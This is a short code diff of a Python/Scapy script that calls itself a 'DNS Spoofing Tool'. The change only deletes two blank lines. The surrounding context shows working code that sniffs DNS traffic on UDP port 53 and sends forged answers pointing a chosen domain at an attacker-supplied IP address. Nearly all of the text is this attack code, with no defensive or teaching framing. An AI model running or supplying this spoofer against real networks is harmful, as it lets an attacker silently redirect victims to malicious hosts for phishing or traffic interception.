@@ -8,7 +8,6 @@ def dns_spoof(pkt, target_domain, spoof_ip):
                       DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa=1, qr=1,\
                       an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=spoof_ip))
         send(spoofed_pkt)
-
 def main():
     parser = argparse.ArgumentParser(description="DNS Spoofing Tool")
     parser.add_argument("--target_domain", type=str, required=True, help="Target domain to spoof")
@@ -17,6 +16,5 @@ def main():
 
     print(f"Starting DNS spoofing for {args.target_domain} redirecting to {args.spoof_ip}")
     sniff(filter="udp port 53", prn=lambda pkt: dns_spoof(pkt, args.target_domain, args.spoof_ip))
-
 if __name__ == "__main__":
     main()
